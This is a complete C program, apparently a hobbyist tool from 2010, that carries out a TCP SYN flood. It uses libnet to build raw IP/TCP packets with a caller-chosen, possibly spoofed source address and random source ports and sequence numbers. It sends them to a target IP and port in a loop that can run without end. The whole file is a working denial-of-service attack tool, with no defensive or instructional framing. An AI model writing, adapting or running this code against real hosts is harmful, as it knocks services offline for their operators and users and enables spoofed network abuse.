
/*
	Created @ 18.12.2010 by TheFox@fox21.at
	Version: 1.0.0
	Copyright (c) 2010 TheFox
	
	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.
	
	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.
	
	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

/*
	Developed and tested with libnet version 1.0.2a.
	Under Debian Linux install libnet0-dev.
*/


#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#include <arpa/inet.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <netinet/ether.h>
#include <sys/socket.h>
#include <libnet.h>

//#define DEBUG
#define SRC_PORT_RND
//#define EXIT_ON_FAIL
#define USLEEP 250
#define ARGC_MIN 4


void usagePrint();

int main(int argc, char **argv){
	
	unsigned int connections = 0;
	unsigned int connectionsc;
	int i, sockfd, sockWriteBytes;
	char *buf = NULL;
	char *srcIpStr = NULL;
	char *dstIpStr = NULL;
	u_long srcIp = 0;
	u_long dstIp = 0;
	u_short srcPort = 0;
	u_short dstPort = 0;
	
	printf("synflood " VERSION " (%s %s)\n", __DATE__, __TIME__);
	puts("Copyright (c) 2010 TheFox@fox21.at\n");
	if(argc < ARGC_MIN)
		usagePrint();
	
	srcIpStr = argv[1];
	dstIpStr = argv[2];
	dstPort = atoi(argv[3]);
	if(argc == 5)
		connections = atoi(argv[4]);
	
	libnet_seed_prand();
	buf = (char *)malloc(LIBNET_IP_H + LIBNET_TCP_H);
	
	srcIp = libnet_name_resolve(srcIpStr, 1);
	if(!srcIp){
		fprintf(stderr, "ERROR: bad SRC ip address: %s\n", srcIpStr);
		exit(1);
	}
	
	dstIp = libnet_name_resolve(dstIpStr, 1);
	if(!dstIp){
		fprintf(stderr, "ERROR: bad DST ip address: %s\n", dstIpStr);
		exit(1);
	}
	
	printf("SRC %s\n", srcIpStr);
	printf("DST %s %d\n", dstIpStr, dstPort);
	puts("\nstart");
	
	// connectionsc < connections
	for(connectionsc = 0; connectionsc < connections || !connections; connectionsc++){
		
		memset(buf, 0, LIBNET_IP_H + LIBNET_TCP_H);
		
#ifdef SRC_PORT_RND
		srcPort = libnet_get_prand(LIBNET_PRu16);
#else
		srcPort++;
		if(srcPort > 65535)
			srcPort = 1;
#endif
		
		printf("connection %6d SPT=%d\n", connectionsc, srcPort);
		
		if((sockfd = libnet_open_raw_sock(IPPROTO_RAW)) == -1){
			//fprintf(stderr, "ERROR libnet_open_raw_sock\n");
			perror("ERROR libnet_open_raw_sock");
			exit(1);
		}

#ifdef DEBUG
		puts("libnet_build_ipv4");
#endif
		libnet_build_ipv4(
			LIBNET_IP_H, // length
			0, // TOS
			libnet_get_prand(LIBNET_PRu16), // ip id
			IP_DF, // flag offset
			64, // ttl
			IPPROTO_TCP, // upper layer protocol
			srcIp,
			dstIp,
			NULL, // payload
			0, // payload length
			buf
		);

#ifdef DEBUG
		puts("libnet_build_tcp");
#endif
		libnet_build_tcp(
			srcPort, // src port
			dstPort, // dest port
			libnet_get_prand(LIBNET_PRu16), // seq num
			0, // ack num
			TH_SYN, // Control bits
			65535, // Advertised Window Size
			0, // Urgent Pointer
			NULL, // data
			0, // data len
			buf + LIBNET_IP_H
		);
		
#ifdef DEBUG
		puts("libnet_do_checksum");
#endif
		libnet_do_checksum(buf, IPPROTO_TCP, LIBNET_TCP_H);

#ifdef DEBUG
		puts("libnet_write_ip");
#endif
		sockWriteBytes = libnet_write_ip(sockfd, buf, LIBNET_IP_H + LIBNET_TCP_H);
		if(sockWriteBytes < LIBNET_IP_H + LIBNET_TCP_H){
			perror("ERROR libnet_write_ip");
#ifdef EXIT_ON_FAIL
			exit(1);
#endif
		}
		
#ifdef DEBUG
		puts("libnet_close_raw_sock");
#endif
		libnet_close_raw_sock(sockfd);
		
		usleep(USLEEP);
		
	}
	
	puts("\nexit 0");
	return 0;
}

void usagePrint(){
	printf("Usage: ./synflood SRC DST DPT [CONNECTIONS]\n");
	exit(1);
}

// EOF
